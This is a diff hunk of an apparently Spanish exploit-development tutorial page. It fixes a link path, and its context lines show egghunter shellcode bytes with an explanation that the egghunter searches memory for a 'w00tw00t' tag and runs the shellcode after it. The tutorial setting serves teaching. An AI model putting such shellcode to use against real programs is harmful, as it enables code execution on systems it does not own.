@@ -1356,7 +1356,7 @@ Hold on...
 "\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7"  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El <code class="language-plaintext highlighter-rouge">egghunter</code> lo que hara sera buscar en toda la memoria la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y ejecutar todo lo que esta despues que en este caso sera nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, el funcionamiento de este egghunter ya fue analizado en otro <a href="/exploitdevelopment/windows-user/egghunters#wow64">post</a> sobre explotación</p>
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">egghunter</code> lo que hara sera buscar en toda la memoria la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y ejecutar todo lo que esta despues que en este caso sera nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, el funcionamiento de este egghunter ya fue analizado en otro <a href="/exploit-development/windows-user/egghunters#wow64">post</a> sobre explotación</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
